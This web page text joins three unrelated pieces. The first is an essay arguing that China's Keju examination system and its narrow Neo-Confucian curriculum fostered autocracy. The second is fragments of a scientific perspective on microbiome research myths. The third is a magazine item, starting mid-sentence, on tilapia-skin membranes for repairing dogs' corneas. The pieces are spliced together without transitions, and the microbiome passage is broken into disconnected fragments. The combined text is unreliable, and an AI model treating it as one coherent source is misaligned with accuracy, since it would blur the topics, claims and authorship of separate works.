<p><span>T</span>he most direct way <em>Keju</em> decimated Chinese society is through talent monopoly but there were others. <em>Keju</em> also monopolised the time and mental energy of its candidates. <em>Keju</em> was not a one-shot deal. A candidate could take the test multiple times. In a <a href="https://www.journals.uchicago.edu/doi/10.1086/714934" target="_blank" rel="noreferrer noopener">dataset</a> that has information on the 11,706 <em>Keju</em> candidates during the Ming dynasty, the average age passing the final stage of <em>Keju</em> was 32, approaching middle age at a time when average life expectancy was much lower than today. The oldest in the dataset was was probably Gui Youguang (1506-1571). Before passing the provincial examination in 1540 at the youngish age of 34, Gui had already failed it on six occasions. He then proceeded to toil for more than 24 years of his life and finally attained his <em>Jinshi</em> degree in 1565, although ranking near the bottom of his class and at the ripe age of 59. Unfortunately, he did not bask in his exalted status for long, as he died aged 65. For him, and many others, <em>Keju</em> was a life-long endeavour.</p>
<!-- -->
<p>The <em>Keju</em> curriculum was formidable and required memorising close to 400,000 characters. Is there spare residual energy, capacity and curiosity left to pursue other mentally taxing activities, such as ideation of new thoughts, new politics, and discoveries of natural phenomena? In my <a href="https://yalebooks.co.uk/book/9780300266368/the-rise-and-fall-of-the-east/" target="_blank" rel="noreferrer noopener">book</a> <em>The Rise and Fall of the EAST</em> (2023), I show that Chinese technology began to stagnate as <em>Keju</em> gained dominance. The brain power that ended up in the state did not flow to Chinese society, the economy or human creativity.</p>
<p>Mental energy aside, the values drilled deeply into <em>Keju</em> candidates were pro-autocracy and authoritarian. <em>Keju</em> legitimates statism. Boys as young as three or four began to practise writing characters that were meant to instil admiration of, and devotion to, the ideas and teachings of the master – Confucius – which would eventually be tested on <em>Keju</em>. By the Ming dynasty, the initial plurality of the <em>Keju</em> subjects gave way to one subject only, Confucianism – ‘knowledge of classics, stereotyped theories of administration, and literary attainments’.</p>
<p>Autocracy and <em>Keju</em> became ever more intimately intertwined</p>
<p>Imagine repeated exposures to the statist values at that tender age, producing what psychologists call ‘an imprinting effect’. The autocratic values were incubated in substance but also by the format of <em>Keju</em>; this was standardised testing par excellence. When <em>Keju</em> was first established, candidates were tested on a wide range of subject matters but, after the Song dynasty, the <em>Keju</em> curriculum became progressively stratified and exceedingly narrow. Candidates were required to fill in the blanks with missing words or phrases in excerpted texts from the Confucian classics. The Yuan dynasty (1271-1368) narrowed the <em>Keju</em> curriculum further. Only a streamlined version of annotations of Confucian classics was allowed, the so-called Neo-Confucianism, which was the brainchild of the great Confucian scholar Zhu Xi (1130-1200) of the Song dynasty.</p>
<p>Neo-Confucianism is a pared-down version of classical Confucianism, and it strips away some of the moral veneer of its classical predecessor. Summarising a common view among historians, Peter K Bol <a href="https://www.hup.harvard.edu/catalog.php?isbn=9780674053243" target="_blank" rel="noreferrer noopener">observes</a> in <em>Neo-Confucianism in History</em> (2010) that this version of Confucianism ‘provided a justification for seeking external authority in the ruler’ and stipulated the responsibility for transforming the world as that of the emperor alone. The Neo-Confucianist <em>Keju</em> curriculum was rigid, narrow and absolutist, and was single-minded in its advocacy of a hierarchical order – subordination to the ruler, to the elderly, and to the male gender. No scope for scepticism and ambiguity was allowed. Autocracy and <em>Keju</em> thus became ever more intimately intertwined.</p>
<p>There was, however, a massive operational advantage to the Neo-Confucianist curriculum: it standardised everything. Standardisation abhors nuance and the evaluations became more straightforward as the baseline comparison was more clearly delineated. There was objectivity, even if the objectivity was a manufactured artefact. The Chinese invented the modern state and meritocracy, but above all the Chinese invented specialised standardised testing – the memorisation, cognitive inclination and frame of references of an exceedingly narrow ideology.</p>
<p><span>M</span>ing standardised <em>Keju</em> further: it enforced a highly scripted essay format, known as the ‘eight-legged essay’, or <em>baguwen</em> in Chinese (八股文), to which every <em>Keju</em> candidate had to adhere. A ‘leg’ here refers to each section of an essay, with a <em>Keju</em> essay requiring eight sections: <span>1) breaking</span> open the topic; <span>2) receiving</span> the topic; <span>3) beginning</span> the discussion; <span>4) the</span> initial leg; <span>5) the</span> transition leg; <span>6) the</span> middle leg; <span>7) the</span> later leg; and <span>8) conclusion.</span> The eight-legged essay fixed more than the aggregate structure of exposition. The specifications were granular and detailed. For example, the number of phrases was specified in each of the sections and the entire essay required expressions in paired sentences – a minimum of six paired sentences, up to a maximum of 12. The key contribution of the eight-legged essay is that it packed information into a pre-set presentational format.</p>
<p>Standardisation was designed to scale the <em>Keju</em> system and it succeeded brilliantly in that regard, but it had a devastating effect on expositional freedom and human creativity. All elements of subjectivity and judgment were taken out. In his <a href="https://cup.cuhk.edu.hk/index.php?route=product/product&amp;product_id=461" target="_blank" rel="noreferrer noopener">book</a> <em>Traditional Government in Imperial China</em> (1982), the historian Ch’ien Mu describes the ‘eight-legged essay’ as ‘the greatest destroyer of human talent’.</p>
<p>A bane to human creativity was a boon to autocracy. Standardised testing was conducive to authoritarianism. In his <a href="https://www.wiley.com/en-gb/Who%27s+Afraid+of+the+Big+Bad+Dragon%3F%3A+Why+China+Has+the+Best+%28and+Worst%29+Education+System+in+the+World-p-9781118487136" target="_blank" rel="noreferrer noopener">book</a> <em>Who’s Afraid of the Big Bad Dragon?</em> (2014), Yong Zhao, professor at the School of Education of the University of Kansas, notes a natural compatibility between authoritarianism and standardised testing. Authoritarianism, he writes, ‘sees education as a way to instil in all students the same knowledge and skills deemed valuable by the authority.’ The standardised tests appeal to an authoritative body for correct answers; as Zhao said in an interview for the US National Education Policy Center, the tests ‘force students to comply with the answers or the way of thinking that the authority wants.’ The direction of deference is automatically established: ‘Then you hold the students, the teachers and, to a lesser extent, the parents accountable for being able to get the answers that the authority wants and to show that they have mastered the skills and the knowledge and possibly even the beliefs that the authority wants.’</p>
<p>Confucianism, thus, functioned as an equivalent of the abstruse and arcane vocabulary of the SAT</p>
<p>In his <a href="https://www.penguin.co.uk/books/193790/the-weirdest-people-in-the-world-by-henrich-joseph/9780141976211" target="_blank" rel="noreferrer noopener">book</a> <em>The WEIRDest People in the World</em> (2020), Joseph Henrich posited that the West prospered because of its early lead in literacy. Yet the substantial <em>Keju</em> literacy produced none of the liberalising effects on Chinese ideas, economy or society. The literacy that Henrich had in mind was a particular kind of literacy – Protestant literacy – and the contrast with <em>Keju</em> literacy could not have been sharper. <em>Keju</em> literacy was drilled and practised in classical and highly stratified Chinese, the language of the imperial court rather than the language of the masses, in sharp contrast to Protestant literacy. Protestant literacy empowered personal agency by embracing and spreading vernaculars of the masses. Henrich’s liberalising <a href="https://aeon.co/essays/american-undergrads-are-too-weird-to-stand-for-all-humanity" target="_blank" rel="noopener">‘WEIRD’ effect</a> – Western, educated, industrialised, rich and democratic – was a byproduct of Protestant literacy. It is no accident that <em>Keju</em> literacy produced an opposite effect.</p>
<p>Why was there such a close affinity between <em>Keju</em> and Confucianism? The answer is not obvious. Ancient China boasted other great ideologies and traditions, such as Daoism, Mohism and Legalism, but they were completely absent in the <em>Keju</em> curriculum. This ideological single-mindedness of <em>Keju</em> is puzzling and it is puzzling still considering the following: in my book, I document that several emperors who played an instrumental role in inventing and developing <em>Keju</em> were not Confucianists themselves.</p>
<p>The answer may lie in an operational imperative of <em>Keju</em>. Standardised testing is necessary when you want to scale the evaluation. Subjective evaluations, such as relying on reputation, recommendations and interviews, are feasible when the number of candidates under evaluation is small. For example, the Big Three colleges in the US – Harvard, Yale and Princeton – began to embrace the SAT (the standardised test for college admissions) when they started recruiting beyond their traditional, narrow socioeconomic group – the white Anglo-Saxon Protestants (WASPs) in the elite private schools of the east coast. The Chinese emperors made the same decision when they expanded bureaucratic recruitment beyond the nobility and wealthy elites. Standardising and constricting the <em>Keju</em> curriculum were not an optional luxury; it was a necessity to scale <em>Keju</em>.</p>
<p>Confucianism offered an operational advantage. It is textually rich; the verbiage is massive, and the pontifications are incredibly involved, not unlike the verbal portion of the SAT. As noted before, there are approximately 400,000 characters and phrases in the Confucian classics. Using a <a href="https://ctext.org/" target="_blank" rel="noreferrer noopener">website</a>, Chinese Text Project, ‘an online open-access digital library that makes pre-modern Chinese texts available to readers and researchers all around the world’, I found that among the classical texts created before the Han dynasty (206 BCE-220 CE) Confucianism is paragraphically the richest, with 11,184 paragraphs. No other ideologies come remotely close. Legalism has 1,783 paragraphs; Daoism has 1,161 paragraphs, and Mohism has 915 paragraphs. Confucianism, thus, functioned as an equivalent of the abstruse and arcane vocabulary of the SAT, and it was most suited for screening and selecting the desired human capital from a large pool of candidates.</p>
<p>Is it at all possible that <em>Keju</em> successfully anchored and shaped the nature of the Chinese autocracy because of this accidental feature of Confucianism and on account of an operational technicality? Let’s pause, savour and ponder for a moment the momentous implications of this proposition.</p>

                <div id="Sec1-section" data-title="Main"><h2 id="Sec1">Main</h2><p>Human microbiome research has undergone rapid growth over the past two decades and thousands of research papers on this topic are now published every year. Huge sums of money have been spent investigating the human microbiome as a cause of, or potential therapeutic solution to, a wide range of diseases, including inflammatory bowel disease and cardiometabolic conditions. Although truly exciting, the increasing focus on microbiome research has unfortunately also brought with it hype and entrenched certain misconceptions. As a result, many unsupported, or undersupported, statements have become ‘fact’ by virtue of constant repetition. Some are more widespread than others and some are relatively trivial, but, cumulatively, they highlight that misinformation is pervasive in the human microbiome literature. Given the potential importance of human microbiomes for health, it is crucial that claims are based on evidence. In this Perspective, we shine a light on persistent or emerging microbiome myths and misconceptions, outlining factual inaccuracies. We begin with relatively minor, but illustrative, points and build towards issues with greater potential impacts. We have purposefully tried to avoid unnecessary finger pointing at original sources of erroneous information, and instead hope that our insights and critical assessment are helpful to the field.</p></div><div id="Sec2-section" data-title="“Microbiome research is a new field”"><h2 id="Sec2">“Microbiome research is a new field”</h2><p>The pace of human microbiome research has greatly accelerated over the past 15 years, but the field is not in its infancy.

Interestingly, despite the diverse nature of these conditions, and the organs they affect, there are some broadly common recurring microbiota features, such as reduced diversity and increases in facultative anaerobes like Enterobacteriaceae. One common theme amongst these conditions is that they often result in increased levels of inflammation, at local and systemic levels. Such inflammation can, in turn, deplete the gut microbiota (and consequently microbial gene diversity), and allow facultative anaerobes such as Enterobacteriaceae to proliferate. This directly impacts the metabolic output of the microbiota, and its interactions with the host. Additionally, there are other host factors that contribute to disease and gut microbiota composition, such as age, BMI and medication, as well as host metabolism and immune response.

Given the importance of continued cultivation-based work for the progression of microbiome research, it is gratifying that this myth has become less prevalent in recent years following the publication of the aforementioned high-impact studies that demonstrate it to be false.

However, knowledge is still evolving on many of these; consequently, we have largely focused on concepts where we believe there is a strong evidence base for rejecting myths and misconceptions. Although some of the points above may seem trivial, we argue that the accuracy of details such as these matters. If we are consistently repeating falsehoods about minor details, can our accuracy be relied upon when covering more important matters? We hope that, by illustrating just a few examples of microbiome myths and misconceptions, we can draw increased attention to the potential problems of over-simplification and insufficient critical assessment in the microbiome literature.</p><p>Given the many potential health impacts, the huge amount of funding and the keen public interest in microbiomes, rejection of unfounded assertions is crucial if we wish to avoid expending finite resources researching unproductive avenues and undermining public confidence in our conclusions.</p></div></div>

Researchers have explored its use in applications from bandaging burn victims and correcting abdominal hernias to mending heart valves and reconstructing vaginas.</p>

<p>Inspired by colleagues in a dozen other specialties, Mirza Melo, a veterinary ophthalmologist in northeastern Brazil's Ceará state, tested tilapia skin to treat a pervasive problem in her field: corneal ulcers and perforations, particularly in dogs with short snouts. “These are species with very prominent eyes,” she says. “So they get injured often.“</p>

<p>Such corneal injuries are commonly treated by surgically placing a membrane made of horse placenta (also a collagen source but with a lower concentration than tilapia skin, Melo says) over the affected area to help it regenerate. Melo first swapped that membrane for tilapia skin in 2019, when she successfully operated on a Shih Tzu with a severe corneal perforation.</p>

<p>Brazil's Burn Support Institute and the Federal University of Ceará—home of the Tilapia Skin Project, which pioneered the skin's use to treat burns—approached her about the surgical technique. With their support Melo began testing a membrane she called the acellular dermal matrix (ADM), made of pure collagen extracted from the fish skin.</p>

<p>Collagen is known to stimulate cellular growth and to “guide the generation of various tissues,” Melo says. A tilapia's collagen supply and quality remain high throughout the fish's entire life, whereas horse-placenta collagen varies depending on factors such as the animal's age and weight, she says.</p>

<p>The processed ADM resembles a thick sheet of paper. Veterinarians rehydrate it with saline solution before surgery, then lay it over a dog's corneal lesion and suture it into place, where it acts as scaffolding for regenerating cells.</p>

<p>The 400-plus dogs Melo has treated so far have shown no pain or problems with infection after surgery. They also healed quickly, with minimal scarring that would affect postsurgical care.</p>

<p>Current corneal repair strategies such as using horse placenta, grafting and transplant have good results—but scarring continues to be a concern, says Robson Santos, a veterinary ophthalmologist not involved in the ADM project. “Tilapia skin is an excellent alternative to the well-established techniques we already have,” he says.</p>

<p>Melo is now looking to use the technique on cats, and she says discussions have already begun on how to adapt it for humans. She also hopes to take her research to the eye's retina, which is particularly challenging to treat because of its extremely sensitive specialized neurons.</p>

<p>“It's where we have the most limited resources, in both veterinary and human ophthalmology,” Melo says. “So we hope to get there one day.”</p></div><section><p>This article was originally published with the title "Fish Eye" in Scientific American  329, 3, 17 (October 2023)</p><p>doi:10.1038/scientificamerican1023-17a</p></section><section><h3>ABOUT THE AUTHOR(S)</h3><div><ul></ul><p><strong>Jill Langlois</strong> is a freelance journalist based in São Paulo, Brazil, and writes for publications such as <em>National Geographic, Time</em> and the <em>New York Times</em>.
